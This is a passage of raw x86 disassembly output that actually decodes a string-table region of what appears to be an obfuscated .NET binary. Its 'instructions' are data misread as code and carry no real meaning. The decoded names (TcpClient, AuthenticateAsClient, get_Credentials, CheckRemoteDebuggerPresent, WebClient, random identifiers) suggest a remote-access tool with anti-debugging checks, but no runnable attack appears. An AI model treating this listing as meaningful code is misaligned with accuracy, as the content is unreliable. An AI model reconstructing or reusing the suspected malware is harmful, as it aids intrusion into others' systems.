  4093e1:	74 5f                	je     0x409442
  4093e3:	43                   	inc    %ebx
  4093e4:	72 65                	jb     0x40944b
  4093e6:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4093e9:	74 69                	je     0x409454
  4093eb:	61                   	popa
  4093ec:	6c                   	insb   (%dx),%es:(%edi)
  4093ed:	73 00                	jae    0x4093ef
  4093ef:	45                   	inc    %ebp
  4093f0:	71 75                	jno    0x409467
  4093f2:	61                   	popa
  4093f3:	6c                   	insb   (%dx),%es:(%edi)
  4093f4:	73 00                	jae    0x4093f6
  4093f6:	53                   	push   %ebx
  4093f7:	73 6c                	jae    0x409465
  4093f9:	50                   	push   %eax
  4093fa:	72 6f                	jb     0x40946b
  4093fc:	74 6f                	je     0x40946d
  4093fe:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409401:	73 00                	jae    0x409403
  409403:	53                   	push   %ebx
  409404:	79 73                	jns    0x409479
  409406:	74 65                	je     0x40946d
  409408:	6d                   	insl   (%dx),%es:(%edi)
  409409:	2e 57                	cs push %edi
  40940b:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  409412:	46                   	inc    %esi
  409413:	6f                   	outsl  %ds:(%esi),(%dx)
  409414:	72 6d                	jb     0x409483
  409416:	73 00                	jae    0x409418
  409418:	44                   	inc    %esp
  409419:	6e                   	outsb  %ds:(%esi),(%dx)
  40941a:	73 00                	jae    0x40941c
  40941c:	43                   	inc    %ebx
  40941d:	6f                   	outsl  %ds:(%esi),(%dx)
  40941e:	6e                   	outsb  %ds:(%esi),(%dx)
  40941f:	74 61                	je     0x409482
  409421:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  409428:	74 65                	je     0x40948f
  40942a:	6d                   	insl   (%dx),%es:(%edi)
  40942b:	2e 43                	cs inc %ebx
  40942d:	6f                   	outsl  %ds:(%esi),(%dx)
  40942e:	6c                   	insb   (%dx),%es:(%edi)
  40942f:	6c                   	insb   (%dx),%es:(%edi)
  409430:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409435:	6e                   	outsb  %ds:(%esi),(%dx)
  409436:	73 00                	jae    0x409438
  409438:	53                   	push   %ebx
  409439:	74 72                	je     0x4094ad
  40943b:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409442:	74 4f                	je     0x409493
  409444:	70 74                	jo     0x4094ba
  409446:	69 6f 6e 73 00 52 67 	imul   $0x67520073,0x6e(%edi),%ebp
  40944d:	75 4a                	jne    0x409499
  40944f:	56                   	push   %esi
  409450:	45                   	inc    %ebp
  409451:	5a                   	pop    %edx
  409452:	61                   	popa
  409453:	6d                   	insl   (%dx),%es:(%edi)
  409454:	61                   	popa
  409455:	47                   	inc    %edi
  409456:	4d                   	dec    %ebp
  409457:	56                   	push   %esi
  409458:	6f                   	outsl  %ds:(%esi),(%dx)
  409459:	73 00                	jae    0x40945b
  40945b:	47                   	inc    %edi
  40945c:	65 74 49             	gs je  0x4094a8
  40945f:	6d                   	insl   (%dx),%es:(%edi)
  409460:	61                   	popa
  409461:	67 65 44             	addr16 gs inc %esp
  409464:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409468:	65 72 73             	gs jb  0x4094de
  40946b:	00 52 75             	add    %dl,0x75(%edx)
  40946e:	6e                   	outsb  %ds:(%esi),(%dx)
  40946f:	74 69                	je     0x4094da
  409471:	6d                   	insl   (%dx),%es:(%edi)
  409472:	65 48                	gs dec %eax
  409474:	65 6c                	gs insb (%dx),%es:(%edi)
  409476:	70 65                	jo     0x4094dd
  409478:	72 73                	jb     0x4094ed
  40947a:	00 53 73             	add    %dl,0x73(%ebx)
  40947d:	6c                   	insb   (%dx),%es:(%edi)
  40947e:	50                   	push   %eax
  40947f:	6f                   	outsl  %ds:(%esi),(%dx)
  409480:	6c                   	insb   (%dx),%es:(%edi)
  409481:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409488:	72 73                	jb     0x4094fd
  40948a:	00 46 69             	add    %al,0x69(%esi)
  40948d:	6c                   	insb   (%dx),%es:(%edi)
  40948e:	65 41                	gs inc %ecx
  409490:	63 63 65             	arpl   %esp,0x65(%ebx)
  409493:	73 73                	jae    0x409508
  409495:	00 47 65             	add    %al,0x65(%edi)
  409498:	74 43                	je     0x4094dd
  40949a:	75 72                	jne    0x40950e
  40949c:	72 65                	jb     0x409503
  40949e:	6e                   	outsb  %ds:(%esi),(%dx)
  40949f:	74 50                	je     0x4094f1
  4094a1:	72 6f                	jb     0x409512
  4094a3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4094a6:	73 00                	jae    0x4094a8
  4094a8:	49                   	dec    %ecx
  4094a9:	50                   	push   %eax
  4094aa:	41                   	inc    %ecx
  4094ab:	64 64 72 65          	fs fs jb 0x409514
  4094af:	73 73                	jae    0x409524
  4094b1:	00 53 79             	add    %dl,0x79(%ebx)
  4094b4:	73 74                	jae    0x40952a
  4094b6:	65 6d                	gs insl (%dx),%es:(%edi)
  4094b8:	2e 4e                	cs dec %esi
  4094ba:	65 74 2e             	gs je  0x4094eb
  4094bd:	53                   	push   %ebx
  4094be:	6f                   	outsl  %ds:(%esi),(%dx)
  4094bf:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4094c2:	74 73                	je     0x409537
  4094c4:	00 73 65             	add    %dh,0x65(%ebx)
  4094c7:	74 5f                	je     0x409528
  4094c9:	41                   	inc    %ecx
  4094ca:	72 67                	jb     0x409533
  4094cc:	75 6d                	jne    0x40953b
  4094ce:	65 6e                	outsb  %gs:(%esi),(%dx)
  4094d0:	74 73                	je     0x409545
  4094d2:	00 53 79             	add    %dl,0x79(%ebx)
  4094d5:	73 74                	jae    0x40954b
  4094d7:	65 6d                	gs insl (%dx),%es:(%edi)
  4094d9:	45                   	inc    %ebp
  4094da:	76 65                	jbe    0x409541
  4094dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4094dd:	74 73                	je     0x409552
  4094df:	00 45 78             	add    %al,0x78(%ebp)
  4094e2:	69 73 74 73 00 51 64 	imul   $0x64510073,0x74(%ebx),%esi
  4094e9:	62 50 52             	bound  %edx,0x52(%eax)
  4094ec:	47                   	inc    %edi
  4094ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4094ee:	72 64                	jb     0x409554
  4094f0:	67 59                	addr16 pop %ecx
  4094f2:	50                   	push   %eax
  4094f3:	6a 43                	push   $0x43
  4094f5:	74 00                	je     0x4094f7
  4094f7:	4a                   	dec    %edx
  4094f8:	47                   	inc    %edi
  4094f9:	43                   	inc    %ebx
  4094fa:	69 46 69 4a 4d 49 54 	imul   $0x54494d4a,0x69(%esi),%eax
  409501:	47                   	inc    %edi
  409502:	44                   	inc    %esp
  409503:	76 47                	jbe    0x40954c
  409505:	4d                   	dec    %ebp
  409506:	74 00                	je     0x409508
  409508:	46                   	inc    %esi
  409509:	62 52 55             	bound  %edx,0x55(%edx)
  40950c:	6f                   	outsl  %ds:(%esi),(%dx)
  40950d:	51                   	push   %ecx
  40950e:	65 57                	gs push %edi
  409510:	50                   	push   %eax
  409511:	47                   	inc    %edi
  409512:	6a 64                	push   $0x64
  409514:	4f                   	dec    %edi
  409515:	74 00                	je     0x409517
  409517:	78 44                	js     0x40955d
  409519:	75 79                	jne    0x409594
  40951b:	75 6f                	jne    0x40958c
  40951d:	54                   	push   %esp
  40951e:	77 53                	ja     0x409573
  409520:	6c                   	insb   (%dx),%es:(%edi)
  409521:	64 50                	fs push %eax
  409523:	74 00                	je     0x409525
  409525:	49                   	dec    %ecx
  409526:	49                   	dec    %ecx
  409527:	6d                   	insl   (%dx),%es:(%edi)
  409528:	56                   	push   %esi
  409529:	46                   	inc    %esi
  40952a:	47                   	inc    %edi
  40952b:	44                   	inc    %esp
  40952c:	52                   	push   %edx
  40952d:	4a                   	dec    %edx
  40952e:	5a                   	pop    %edx
  40952f:	57                   	push   %edi
  409530:	74 00                	je     0x409532
  409532:	43                   	inc    %ebx
  409533:	6f                   	outsl  %ds:(%esi),(%dx)
  409534:	6e                   	outsb  %ds:(%esi),(%dx)
  409535:	63 61 74             	arpl   %esp,0x74(%ecx)
  409538:	00 49 6d             	add    %cl,0x6d(%ecx)
  40953b:	61                   	popa
  40953c:	67 65 46             	addr16 gs inc %esi
  40953f:	6f                   	outsl  %ds:(%esi),(%dx)
  409540:	72 6d                	jb     0x4095af
  409542:	61                   	popa
  409543:	74 00                	je     0x409545
  409545:	67 65 74 5f          	addr16 gs je 0x4095a8
  409549:	41                   	inc    %ecx
  40954a:	73 46                	jae    0x409592
  40954c:	6c                   	insb   (%dx),%es:(%edi)
  40954d:	6f                   	outsl  %ds:(%esi),(%dx)
  40954e:	61                   	popa
  40954f:	74 00                	je     0x409551
  409551:	73 65                	jae    0x4095b8
  409553:	74 5f                	je     0x4095b4
  409555:	41                   	inc    %ecx
  409556:	73 46                	jae    0x40959e
  409558:	6c                   	insb   (%dx),%es:(%edi)
  409559:	6f                   	outsl  %ds:(%esi),(%dx)
  40955a:	61                   	popa
  40955b:	74 00                	je     0x40955d
  40955d:	4d                   	dec    %ebp
  40955e:	61                   	popa
  40955f:	6e                   	outsb  %ds:(%esi),(%dx)
  409560:	61                   	popa
  409561:	67 65 6d             	gs insl (%dx),%es:(%di)
  409564:	65 6e                	outsb  %gs:(%esi),(%dx)
  409566:	74 42                	je     0x4095aa
  409568:	61                   	popa
  409569:	73 65                	jae    0x4095d0
  40956b:	4f                   	dec    %edi
  40956c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40956f:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409573:	6f                   	outsl  %ds:(%esi),(%dx)
  409574:	6c                   	insb   (%dx),%es:(%edi)
  409575:	6c                   	insb   (%dx),%es:(%edi)
  409576:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  40957b:	6f                   	outsl  %ds:(%esi),(%dx)
  40957c:	6e                   	outsb  %ds:(%esi),(%dx)
  40957d:	6e                   	outsb  %ds:(%esi),(%dx)
  40957e:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  409583:	65 74 00             	gs je  0x409586
  409586:	53                   	push   %ebx
  409587:	79 73                	jns    0x4095fc
  409589:	74 65                	je     0x4095f0
  40958b:	6d                   	insl   (%dx),%es:(%edi)
  40958c:	2e 4e                	cs dec %esi
  40958e:	65 74 00             	gs je  0x409591
  409591:	54                   	push   %esp
  409592:	61                   	popa
  409593:	72 67                	jb     0x4095fc
  409595:	65 74 00             	gs je  0x409598
  409598:	53                   	push   %ebx
  409599:	6f                   	outsl  %ds:(%esi),(%dx)
  40959a:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40959d:	74 00                	je     0x40959f
  40959f:	53                   	push   %ebx
  4095a0:	79 73                	jns    0x409615
  4095a2:	74 65                	je     0x409609
  4095a4:	6d                   	insl   (%dx),%es:(%edi)
  4095a5:	2e 43                	cs inc %ebx
  4095a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4095a8:	6c                   	insb   (%dx),%es:(%edi)
  4095a9:	6c                   	insb   (%dx),%es:(%edi)
  4095aa:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4095af:	6e                   	outsb  %ds:(%esi),(%dx)
  4095b0:	73 2e                	jae    0x4095e0
  4095b2:	49                   	dec    %ecx
  4095b3:	45                   	inc    %ebp
  4095b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4095b5:	75 6d                	jne    0x409624
  4095b7:	65 72 61             	gs jb  0x40961b
  4095ba:	74 6f                	je     0x40962b
  4095bc:	72 2e                	jb     0x4095ec
  4095be:	52                   	push   %edx
  4095bf:	65 73 65             	gs jae 0x409627
  4095c2:	74 00                	je     0x4095c4
  4095c4:	67 65 74 5f          	addr16 gs je 0x409627
  4095c8:	4f                   	dec    %edi
  4095c9:	66 66 73 65          	data16 data16 jae 0x409632
  4095cd:	74 00                	je     0x4095cf
  4095cf:	73 65                	jae    0x409636
  4095d1:	74 5f                	je     0x409632
  4095d3:	4f                   	dec    %edi
  4095d4:	66 66 73 65          	data16 data16 jae 0x40963d
  4095d8:	74 00                	je     0x4095da
  4095da:	53                   	push   %ebx
  4095db:	70 6c                	jo     0x409649
  4095dd:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  4095e4:	00 
  4095e5:	53                   	push   %ebx
  4095e6:	69 6e 67 6c 65 4f 72 	imul   $0x724f656c,0x67(%esi),%ebp
  4095ed:	44                   	inc    %esp
  4095ee:	65 66 61             	gs popaw
  4095f1:	75 6c                	jne    0x40965f
  4095f3:	74 00                	je     0x4095f5
  4095f5:	49                   	dec    %ecx
  4095f6:	41                   	inc    %ecx
  4095f7:	73 79                	jae    0x409672
  4095f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4095fa:	63 52 65             	arpl   %edx,0x65(%edx)
  4095fd:	73 75                	jae    0x409674
  4095ff:	6c                   	insb   (%dx),%es:(%edi)
  409600:	74 00                	je     0x409602
  409602:	45                   	inc    %ebp
  409603:	78 42                	js     0x409647
  409605:	64 6c                	fs insb (%dx),%es:(%edi)
  409607:	4e                   	dec    %esi
  409608:	42                   	inc    %edx
  409609:	74 73                	je     0x40967e
  40960b:	57                   	push   %edi
  40960c:	4c                   	dec    %esp
  40960d:	77 6f                	ja     0x40967e
  40960f:	73 6d                	jae    0x40967e
  409611:	74 00                	je     0x409613
  409613:	54                   	push   %esp
  409614:	6f                   	outsl  %ds:(%esi),(%dx)
  409615:	55                   	push   %ebp
  409616:	70 70                	jo     0x409688
  409618:	65 72 49             	gs jb  0x409664
  40961b:	6e                   	outsb  %ds:(%esi),(%dx)
  40961c:	76 61                	jbe    0x40967f
  40961e:	72 69                	jb     0x409689
  409620:	61                   	popa
  409621:	6e                   	outsb  %ds:(%esi),(%dx)
  409622:	74 00                	je     0x409624
  409624:	57                   	push   %edi
  409625:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409629:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409630:	74 5f                	je     0x409691
  409632:	53                   	push   %ebx
  409633:	73 6c                	jae    0x4096a1
  409635:	43                   	inc    %ebx
  409636:	6c                   	insb   (%dx),%es:(%edi)
  409637:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40963e:	74 5f                	je     0x40969f
  409640:	53                   	push   %ebx
  409641:	73 6c                	jae    0x4096af
  409643:	43                   	inc    %ebx
  409644:	6c                   	insb   (%dx),%es:(%edi)
  409645:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40964c:	74 5f                	je     0x4096ad
  40964e:	54                   	push   %esp
  40964f:	63 70 43             	arpl   %esi,0x43(%eax)
  409652:	6c                   	insb   (%dx),%es:(%edi)
  409653:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40965a:	74 5f                	je     0x4096bb
  40965c:	54                   	push   %esp
  40965d:	63 70 43             	arpl   %esi,0x43(%eax)
  409660:	6c                   	insb   (%dx),%es:(%edi)
  409661:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409668:	74 68                	je     0x4096d2
  40966a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40966c:	74 69                	je     0x4096d7
  40966e:	63 61 74             	arpl   %esp,0x74(%ecx)
  409671:	65 41                	gs inc %ecx
  409673:	73 43                	jae    0x4096b8
  409675:	6c                   	insb   (%dx),%es:(%edi)
  409676:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  40967d:	73 74                	jae    0x4096f3
  40967f:	65 6d                	gs insl (%dx),%es:(%edi)
  409681:	2e 4d                	cs dec %ebp
  409683:	61                   	popa
  409684:	6e                   	outsb  %ds:(%esi),(%dx)
  409685:	61                   	popa
  409686:	67 65 6d             	gs insl (%dx),%es:(%di)
  409689:	65 6e                	outsb  %gs:(%esi),(%dx)
  40968b:	74 00                	je     0x40968d
  40968d:	45                   	inc    %ebp
  40968e:	6e                   	outsb  %ds:(%esi),(%dx)
  40968f:	76 69                	jbe    0x4096fa
  409691:	72 6f                	jb     0x409702
  409693:	6e                   	outsb  %ds:(%esi),(%dx)
  409694:	6d                   	insl   (%dx),%es:(%edi)
  409695:	65 6e                	outsb  %gs:(%esi),(%dx)
  409697:	74 00                	je     0x409699
  409699:	53                   	push   %ebx
  40969a:	79 73                	jns    0x40970f
  40969c:	74 65                	je     0x409703
  40969e:	6d                   	insl   (%dx),%es:(%edi)
  40969f:	2e 43                	cs inc %ebx
  4096a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4096a2:	6c                   	insb   (%dx),%es:(%edi)
  4096a3:	6c                   	insb   (%dx),%es:(%edi)
  4096a4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4096a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4096aa:	73 2e                	jae    0x4096da
  4096ac:	49                   	dec    %ecx
  4096ad:	45                   	inc    %ebp
  4096ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4096af:	75 6d                	jne    0x40971e
  4096b1:	65 72 61             	gs jb  0x409715
  4096b4:	74 6f                	je     0x409725
  4096b6:	72 2e                	jb     0x4096e6
  4096b8:	67 65 74 5f          	addr16 gs je 0x40971b
  4096bc:	43                   	inc    %ebx
  4096bd:	75 72                	jne    0x409731
  4096bf:	72 65                	jb     0x409726
  4096c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4096c2:	74 00                	je     0x4096c4
  4096c4:	47                   	inc    %edi
  4096c5:	65 74 43             	gs je  0x40970b
  4096c8:	75 72                	jne    0x40973c
  4096ca:	72 65                	jb     0x409731
  4096cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4096cd:	74 00                	je     0x4096cf
  4096cf:	43                   	inc    %ebx
  4096d0:	68 65 63 6b 52       	push   $0x526b6365
  4096d5:	65 6d                	gs insl (%dx),%es:(%edi)
  4096d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4096d8:	74 65                	je     0x40973f
  4096da:	44                   	inc    %esp
  4096db:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4096df:	67 65 72 50          	addr16 gs jb 0x409733
  4096e3:	72 65                	jb     0x40974a
  4096e5:	73 65                	jae    0x40974c
  4096e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4096e8:	74 00                	je     0x4096ea
  4096ea:	67 65 74 5f          	addr16 gs je 0x40974d
  4096ee:	52                   	push   %edx
  4096ef:	65 6d                	gs insl (%dx),%es:(%edi)
  4096f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4096f2:	74 65                	je     0x409759
  4096f4:	45                   	inc    %ebp
  4096f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4096f6:	64 50                	fs push %eax
  4096f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4096f9:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409700:	5f                   	pop    %edi
  409701:	43                   	inc    %ebx
  409702:	6f                   	outsl  %ds:(%esi),(%dx)
  409703:	75 6e                	jne    0x409773
  409705:	74 00                	je     0x409707
  409707:	67 65 74 5f          	addr16 gs je 0x40976a
  40970b:	50                   	push   %eax
  40970c:	72 6f                	jb     0x40977d
  40970e:	63 65 73             	arpl   %esp,0x73(%ebp)
  409711:	73 6f                	jae    0x409782
  409713:	72 43                	jb     0x409758
  409715:	6f                   	outsl  %ds:(%esi),(%dx)
  409716:	75 6e                	jne    0x409786
  409718:	74 00                	je     0x40971a
  40971a:	47                   	inc    %edi
  40971b:	65 74 50             	gs je  0x40976e
  40971e:	61                   	popa
  40971f:	74 68                	je     0x409789
  409721:	52                   	push   %edx
  409722:	6f                   	outsl  %ds:(%esi),(%dx)
  409723:	6f                   	outsl  %ds:(%esi),(%dx)
  409724:	74 00                	je     0x409726
  409726:	50                   	push   %eax
  409727:	61                   	popa
  409728:	72 61                	jb     0x40978b
  40972a:	6d                   	insl   (%dx),%es:(%edi)
  40972b:	65 74 65             	gs je  0x409793
  40972e:	72 69                	jb     0x409799
  409730:	7a 65                	jp     0x409797
  409732:	64 54                	fs push %esp
  409734:	68 72 65 61 64       	push   $0x64616572
  409739:	53                   	push   %ebx
  40973a:	74 61                	je     0x40979d
  40973c:	72 74                	jb     0x4097b2
  40973e:	00 43 6f             	add    %al,0x6f(%ebx)
  409741:	6e                   	outsb  %ds:(%esi),(%dx)
  409742:	76 65                	jbe    0x4097a9
  409744:	72 74                	jb     0x4097ba
  409746:	00 43 61             	add    %al,0x61(%ebx)
  409749:	73 74                	jae    0x4097bf
  40974b:	00 46 61             	add    %al,0x61(%esi)
  40974e:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409755:	54 
  409756:	6f                   	outsl  %ds:(%esi),(%dx)
  409757:	4c                   	dec    %esp
  409758:	69 73 74 00 65 51 74 	imul   $0x74516500,0x74(%ebx),%esi
  40975f:	64 77 79             	fs ja  0x4097db
  409762:	71 74                	jno    0x4097d8
  409764:	76 5a                	jbe    0x4097c0
  409766:	48                   	dec    %eax
  409767:	66 76 74             	data16 jbe 0x4097de
  40976a:	00 53 79             	add    %dl,0x79(%ebx)
  40976d:	73 74                	jae    0x4097e3
  40976f:	65 6d                	gs insl (%dx),%es:(%edi)
  409771:	2e 43                	cs inc %ebx
  409773:	6f                   	outsl  %ds:(%esi),(%dx)
  409774:	6c                   	insb   (%dx),%es:(%edi)
  409775:	6c                   	insb   (%dx),%es:(%edi)
  409776:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40977b:	6e                   	outsb  %ds:(%esi),(%dx)
  40977c:	73 2e                	jae    0x4097ac
  40977e:	49                   	dec    %ecx
  40977f:	45                   	inc    %ebp
  409780:	6e                   	outsb  %ds:(%esi),(%dx)
  409781:	75 6d                	jne    0x4097f0
  409783:	65 72 61             	gs jb  0x4097e7
  409786:	74 6f                	je     0x4097f7
  409788:	72 2e                	jb     0x4097b8
  40978a:	4d                   	dec    %ebp
  40978b:	6f                   	outsl  %ds:(%esi),(%dx)
  40978c:	76 65                	jbe    0x4097f3
  40978e:	4e                   	dec    %esi
  40978f:	65 78 74             	gs js  0x409806
  409792:	00 53 79             	add    %dl,0x79(%ebx)
  409795:	73 74                	jae    0x40980b
  409797:	65 6d                	gs insl (%dx),%es:(%edi)
  409799:	2e 54                	cs push %esp
  40979b:	65 78 74             	gs js  0x409812
  40979e:	00 4e 55             	add    %cl,0x55(%esi)
  4097a1:	48                   	dec    %eax
  4097a2:	46                   	inc    %esi
  4097a3:	66 65 71 6c          	data16 gs jno 0x409813
  4097a7:	42                   	inc    %edx
  4097a8:	75 00                	jne    0x4097aa
  4097aa:	58                   	pop    %eax
  4097ab:	59                   	pop    %ecx
  4097ac:	71 51                	jno    0x4097ff
  4097ae:	63 50 56             	arpl   %edx,0x56(%eax)
  4097b1:	55                   	push   %ebp
  4097b2:	50                   	push   %eax
  4097b3:	45                   	inc    %ebp
  4097b4:	70 75                	jo     0x40982b
  4097b6:	54                   	push   %esp
  4097b7:	75 00                	jne    0x4097b9
  4097b9:	65 58                	gs pop %eax
  4097bb:	7a 58                	jp     0x409815
  4097bd:	4c                   	dec    %esp
  4097be:	6d                   	insl   (%dx),%es:(%edi)
  4097bf:	45                   	inc    %ebp
  4097c0:	73 79                	jae    0x40983b
  4097c2:	4d                   	dec    %ebp
  4097c3:	67 4a                	addr16 dec %edx
  4097c5:	75 5a                	jne    0x409821
  4097c7:	75 00                	jne    0x4097c9
  4097c9:	54                   	push   %esp
  4097ca:	70 58                	jo     0x409824
  4097cc:	49                   	dec    %ecx
  4097cd:	4f                   	dec    %edi
  4097ce:	6d                   	insl   (%dx),%es:(%edi)
  4097cf:	4e                   	dec    %esi
  4097d0:	5a                   	pop    %edx
  4097d1:	6c                   	insb   (%dx),%es:(%edi)
  4097d2:	75 00                	jne    0x4097d4
  4097d4:	57                   	push   %edi
  4097d5:	74 56                	je     0x40982d
  4097d7:	48                   	dec    %eax
  4097d8:	67 68 53 59 54 45    	addr16 push $0x45545953
  4097de:	59                   	pop    %ecx
  4097df:	48                   	dec    %eax
  4097e0:	54                   	push   %esp
  4097e1:	74 6f                	je     0x409852
  4097e3:	75 00                	jne    0x4097e5
  4097e5:	67 6e                	outsb  %ds:(%si),(%dx)
  4097e7:	72 59                	jb     0x409842
  4097e9:	61                   	popa
  4097ea:	68 78 48 4e 52       	push   $0x524e4878
  4097ef:	74 70                	je     0x409861
  4097f1:	75 00                	jne    0x4097f3
  4097f3:	48                   	dec    %eax
  4097f4:	53                   	push   %ebx
  4097f5:	61                   	popa
  4097f6:	73 63                	jae    0x40985b
  4097f8:	76 6a                	jbe    0x409864
  4097fa:	79 67                	jns    0x409863
  4097fc:	45                   	inc    %ebp
  4097fd:	4a                   	dec    %edx
  4097fe:	4e                   	dec    %esi
  4097ff:	54                   	push   %esp
  409800:	71 75                	jno    0x409877
  409802:	00 5a 41             	add    %bl,0x41(%edx)
  409805:	4b                   	dec    %ebx
  409806:	6c                   	insb   (%dx),%es:(%edi)
  409807:	5a                   	pop    %edx
  409808:	5a                   	pop    %edx
  409809:	53                   	push   %ebx
  40980a:	56                   	push   %esi
  40980b:	68 51 42 41 52       	push   $0x52414251
  409810:	68 72 75 00 67       	push   $0x67007572
  409815:	74 49                	je     0x409860
  409817:	4f                   	dec    %edi
  409818:	7a 6e                	jp     0x409888
  40981a:	45                   	inc    %ebp
  40981b:	54                   	push   %esp
  40981c:	4b                   	dec    %ebx
  40981d:	74 5a                	je     0x409879
  40981f:	45                   	inc    %ebp
  409820:	76 00                	jbe    0x409822
  409822:	68 6f 70 48 48       	push   $0x4848706f
  409827:	50                   	push   %eax
  409828:	74 4e                	je     0x409878
  40982a:	64 6a 78             	fs push $0x78
  40982d:	67 47                	addr16 inc %edi
  40982f:	76 00                	jbe    0x409831
  409831:	54                   	push   %esp
  409832:	63 67 61             	arpl   %esp,0x61(%edi)
  409835:	44                   	inc    %esp
  409836:	7a 4f                	jp     0x409887
  409838:	69 58 4b 76 00 52 63 	imul   $0x63520076,0x4b(%eax),%ebx
  40983f:	4d                   	dec    %ebp
  409840:	49                   	dec    %ecx
  409841:	4c                   	dec    %esp
  409842:	72 6d                	jb     0x4098b1
  409844:	64 70 65             	fs jo  0x4098ac
  409847:	4b                   	dec    %ebx
  409848:	54                   	push   %esp
  409849:	76 00                	jbe    0x40984b
  40984b:	43                   	inc    %ebx
  40984c:	76 4b                	jbe    0x409899
  40984e:	4e                   	dec    %esi
  40984f:	50                   	push   %eax
  409850:	6a 44                	push   $0x44
  409852:	71 59                	jno    0x4098ad
  409854:	57                   	push   %edi
  409855:	56                   	push   %esi
  409856:	76 00                	jbe    0x409858
  409858:	75 55                	jne    0x4098af
  40985a:	56                   	push   %esi
  40985b:	70 76                	jo     0x4098d3
  40985d:	5a                   	pop    %edx
  40985e:	42                   	inc    %edx
  40985f:	68 63 49 4e 59       	push   $0x594e4963
  409864:	76 00                	jbe    0x409866
  409866:	7a 61                	jp     0x4098c9
  409868:	54                   	push   %esp
  409869:	47                   	inc    %edi
  40986a:	42                   	inc    %edx
  40986b:	53                   	push   %ebx
  40986c:	67 63 63 63          	arpl   %esp,0x63(%bp,%di)
  409870:	6e                   	outsb  %ds:(%esi),(%dx)
  409871:	59                   	pop    %ecx
  409872:	76 00                	jbe    0x409874
  409874:	4c                   	dec    %esp
  409875:	4c                   	dec    %esp
  409876:	6a 63                	push   $0x63
  409878:	4a                   	dec    %edx
  409879:	72 77                	jb     0x4098f2
  40987b:	6d                   	insl   (%dx),%es:(%edi)
  40987c:	4b                   	dec    %ebx
  40987d:	51                   	push   %ecx
  40987e:	45                   	inc    %ebp
  40987f:	64 71 6c             	fs jno 0x4098ee
  409882:	48                   	dec    %eax
  409883:	67 76 00             	addr16 jbe 0x409886
  409886:	69 73 50 77 73 47 77 	imul   $0x77477377,0x50(%ebx),%esi
  40988d:	6f                   	outsl  %ds:(%esi),(%dx)
  40988e:	70 6c                	jo     0x4098fc
  409890:	4b                   	dec    %ebx
  409891:	42                   	inc    %edx
  409892:	79 76                	jns    0x40990a
  409894:	00 69 77             	add    %ch,0x77(%ecx)
  409897:	69 48 59 72 45 4f 79 	imul   $0x794f4572,0x59(%eax),%ecx
  40989e:	76 00                	jbe    0x4098a0
  4098a0:	4f                   	dec    %edi
  4098a1:	77 49                	ja     0x4098ec
  4098a3:	43                   	inc    %ebx
  4098a4:	52                   	push   %edx
  4098a5:	65 55                	gs push %ebp
  4098a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4098a8:	79 76                	jns    0x409920
  4098aa:	00 43 64             	add    %al,0x64(%ebx)
  4098ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4098ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4098af:	68 61 51 46 66       	push   $0x66465161
  4098b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4098b5:	68 44 77 00 6e       	push   $0x6e007744
  4098ba:	51                   	push   %ecx
  4098bb:	6d                   	insl   (%dx),%es:(%edi)
  4098bc:	61                   	popa
  4098bd:	53                   	push   %ebx
  4098be:	55                   	push   %ebp
  4098bf:	56                   	push   %esi
  4098c0:	63 65 43             	arpl   %esp,0x43(%ebp)
  4098c3:	46                   	inc    %esi
  4098c4:	77 00                	ja     0x4098c6
  4098c6:	72 46                	jb     0x40990e
  4098c8:	72 48                	jb     0x409912
  4098ca:	77 4d                	ja     0x409919
  4098cc:	42                   	inc    %edx
